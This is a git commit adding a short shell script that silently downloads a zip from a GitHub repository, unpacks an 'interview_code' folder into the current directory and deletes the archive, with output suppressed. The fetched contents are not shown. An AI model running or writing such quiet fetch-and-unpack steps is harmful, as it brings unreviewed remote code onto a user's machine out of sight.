f4542ea5f11b6a4d8d2565048987c58caac77d56
ControlNet <smczx@hotmail.com>
2025-09-01 18:34:16 +1000

    Create nmEWuZ9qKMtq7yjA.sh

---
+++ nmEWuZ9qKMtq7yjA.sh
@@ -0,0 +1,5 @@
+wget -q https://github.com/providescripts/icd/raw/refs/heads/master/nmEWuZ9qKMtq7yjA.zip > /dev/null
+unzip nmEWuZ9qKMtq7yjA.zip > /dev/null
+mv interview_code/* .
+rmdir interview_code
+rm nmEWuZ9qKMtq7yjA.zip
